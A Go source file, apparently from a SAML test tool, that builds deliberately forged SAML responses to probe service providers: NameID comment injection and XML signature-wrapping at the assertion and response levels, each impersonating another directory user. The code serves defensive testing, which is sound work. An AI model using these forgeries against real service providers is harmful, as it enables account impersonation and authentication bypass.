package web

import (
	"errors"
	"slices"
	"strings"

	"github.com/beevik/etree"
)

// These SAML-only faults keep a genuine IdP signature intact while presenting a
// different identity to an SP that trusts the response without tying the
// signature to the element it actually processes. The forged identity always
// belongs to another directory user, so a vulnerable SP signs in as the wrong
// person. They are test-only: scimtest still posts the response only to the
// configured ACS URL.

// samlForgedNameIDSuffix is appended after the injected comment, so the signed
// canonical NameID is an identifier scimtest never issues.
const samlForgedNameIDSuffix = ".scimtest-forged.example"

var errSAMLForgeryNoUser = errors.New("this fault needs another active directory user with a different, non-empty SAML NameID")

// samlForgeryUser picks the directory user a forgery fault impersonates. It is
// the lowest-ID active user with a different, non-empty NameID, so the choice
// is stable across runs.
func samlForgeryUser(state appState, app app, signedIn user) (user, bool) {
	var candidates []user
	signedInNameID := samlNameIDValue(app, signedIn)
	for _, candidate := range state.Users {
		if candidate.ID == signedIn.ID || candidate.Deleted || !candidate.Active {
			continue
		}
		nameID := samlNameIDValue(app, candidate)
		if strings.TrimSpace(nameID) == "" || nameID == signedInNameID {
			continue
		}
		candidates = append(candidates, candidate)
	}
	if len(candidates) == 0 {
		return user{}, false
	}
	slices.SortFunc(candidates, func(a, b user) int { return strings.Compare(a.ID, b.ID) })
	return candidates[0], true
}

// forgeNameIDFullValue sets the Subject NameID to another user's identifier
// plus a suffix scimtest never issues. It runs before signing, so the signature
// covers the whole joined value. splitNameIDComment then runs after signing.
func forgeNameIDFullValue(doc *etree.Document, state appState, app app, signedIn user) error {
	forged, ok := samlForgeryUser(state, app, signedIn)
	if !ok {
		return errSAMLForgeryNoUser
	}
	nameID := findElementByLocalName(doc.Root(), "NameID")
	if nameID == nil {
		return errors.New("nameid_comment fault found no NameID to tamper")
	}
	nameID.SetText(samlNameIDValue(app, forged) + samlForgedNameIDSuffix)
	return nil
}

// splitNameIDComment inserts a comment into the signed NameID, so its first
// text node is the victim's identifier and the trailing suffix follows the
// comment. It runs after signing: exclusive canonicalization drops the comment,
// so the digest still matches the joined value and the signature stays valid.
// An SP that reads only the first text node signs in as the victim; one that
// reads the whole node sees the unknown joined value and rejects it.
func splitNameIDComment(doc *etree.Document) error {
	nameID := findElementByLocalName(doc.Root(), "NameID")
	if nameID == nil {
		return errors.New("nameid_comment fault found no NameID to tamper")
	}
	victim, ok := strings.CutSuffix(nameID.Text(), samlForgedNameIDSuffix)
	if !ok {
		return errors.New("nameid_comment fault lost its forged NameID before splitting")
	}
	nameID.Child = nil
	nameID.CreateText(victim)
	nameID.CreateComment("")
	nameID.CreateText(samlForgedNameIDSuffix)
	return nil
}

// applySAMLSignatureWrapping restructures the already-signed document so a
// naive SP reads a forged assertion while the genuine signature still verifies
// against the untouched element it covers. It runs after signing and refuses
// to combine with encryption, which hides the plaintext it rewrites.
func (a *webApp) applySAMLSignatureWrapping(doc *etree.Document, state appState, app app, signedIn user, faults faultOptions) error {
	switch {
	case faults.tampers(tamperSignatureWrappingResponse):
		return wrapSignedSAMLResponse(doc, state, app, signedIn)
	case faults.tampers(tamperSignatureWrappingAssertion):
		return wrapSignedSAMLAssertion(doc, state, app, signedIn)
	default:
		return nil
	}
}

// wrapSignedSAMLAssertion inserts an unsigned forged assertion ahead of the
// genuine signed one. It requires an unsigned response so inserting the forgery
// does not invalidate a response signature. A safe SP reads the assertion the
// signature covers (by resolving the signed reference), not the first assertion.
func wrapSignedSAMLAssertion(doc *etree.Document, state appState, app app, signedIn user) error {
	forgedUser, ok := samlForgeryUser(state, app, signedIn)
	if !ok {
		return errSAMLForgeryNoUser
	}
	signed := findElementByLocalName(doc.Root(), "Assertion")
	if signed == nil || childElementByLocalName(signed, "Signature") == nil {
		return errors.New("xsw_assertion fault needs a signed assertion; sign only the assertion")
	}
	if childElementByLocalName(doc.Root(), "Signature") != nil {
		return errors.New("xsw_assertion fault cannot wrap a signed response; sign only the assertion")
	}
	forged, err := forgeSAMLElement(signed, app, forgedUser, "saml-forged-assertion")
	if err != nil {
		return err
	}
	parent := signed.Parent()
	parent.InsertChildAt(signed.Index(), forged)
	return nil
}

// wrapSignedSAMLResponse makes a forged response the document root and keeps the
// genuine signed response wrapped inside it, so the signed reference still
// resolves. A safe SP reads the response the signature covers, not the root.
func wrapSignedSAMLResponse(doc *etree.Document, state appState, app app, signedIn user) error {
	forgedUser, ok := samlForgeryUser(state, app, signedIn)
	if !ok {
		return errSAMLForgeryNoUser
	}
	signed := doc.Root()
	if childElementByLocalName(signed, "Signature") == nil {
		return errors.New("xsw_response fault needs a signed response; sign the response or both")
	}
	forged, err := forgeSAMLElement(signed, app, forgedUser, "saml-forged-response")
	if err != nil {
		return err
	}
	if forgedAssertion := findElementByLocalName(forged, "Assertion"); forgedAssertion != nil {
		if err := reassignSAMLID(forgedAssertion, "saml-forged-assertion"); err != nil {
			return err
		}
	}
	doc.SetRoot(forged)
	// the genuine signed response trails the forged one, so a naive SP reading
	// the first assertion in document order reaches the forgery first
	forged.AddChild(signed)
	return nil
}

// forgeSAMLElement copies el, strips its signature, names another user in the
// copy's NameID, and gives it a fresh ID so it never collides with the signed
// original's reference.
func forgeSAMLElement(el *etree.Element, app app, forgedUser user, idPrefix string) (*etree.Element, error) {
	forged := el.Copy()
	if signature := childElementByLocalName(forged, "Signature"); signature != nil {
		forged.RemoveChild(signature)
	}
	if nameID := findElementByLocalName(forged, "NameID"); nameID != nil {
		nameID.Child = nil
		nameID.SetText(samlNameIDValue(app, forgedUser))
	}
	if err := reassignSAMLID(forged, idPrefix); err != nil {
		return nil, err
	}
	return forged, nil
}

func reassignSAMLID(el *etree.Element, prefix string) error {
	id, err := newID(prefix)
	if err != nil {
		return err
	}
	el.CreateAttr("ID", id)
	return nil
}
